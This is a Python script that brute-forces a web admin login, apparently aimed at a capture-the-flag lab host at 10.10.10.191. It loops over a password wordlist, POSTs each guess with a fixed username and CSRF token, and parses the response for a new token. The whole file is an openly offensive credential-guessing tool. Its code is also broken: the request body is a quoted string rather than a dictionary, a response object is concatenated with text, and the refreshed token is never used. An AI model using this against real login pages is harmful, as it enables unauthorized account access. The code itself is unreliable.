import requests
from bs4 import BeautifulSoup

curr_token = "22da3ff2fb34ca62b920d85b6cf56aedd0e70a98"
username = "fergus"

with open("docswords.txt") as f:
    content = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content] 
print (content)

for x in content:
	password = x

	url = "http://10.10.10.191/admin/"
	postobj = "{'tokenCSRF':curr_token,'username':username,'password':password}"

	x = requests.post(url,data = postobj)
	myfilename = x + ".txt"
	filewrite = open(myfilename, "w")
	filewrite.write(x.text)
	filewrite.close()

	fileread = open(myfilename,"r")
	#print(fileread.read())

	soup = BeautifulSoup(fileread, 'html.parser')

	#print (soup.title)

	inputTag = soup.findAll(attrs={"name" : "tokenCSRF"})
	fileread.close()
